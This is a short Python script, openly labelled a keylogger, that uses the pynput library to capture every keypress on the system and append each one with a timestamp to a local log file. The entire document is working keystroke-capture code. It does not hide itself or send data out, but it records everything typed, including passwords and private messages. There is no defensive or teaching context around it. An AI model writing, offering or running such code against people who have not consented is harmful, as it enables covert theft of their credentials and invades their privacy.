from pynput.keyboard import Listener
from datetime import datetime
import os

# File to store logs
log_file = "logs/keylog.txt"

# Ensure the logs folder exists
os.makedirs("logs", exist_ok=True)

def write_log(key):
    key = str(key).replace("'", "")  # Clean the quotes

    # Handle special keys
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key.startswith("Key."):
        key = f"[{key[4:].upper()}]"

    # Timestamped entry
    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(log_file, "a") as f:
        f.write(f"{time_stamp}: {key}\n")

# Start the keylogger
with Listener(on_press=write_log) as listener:
    listener.join()
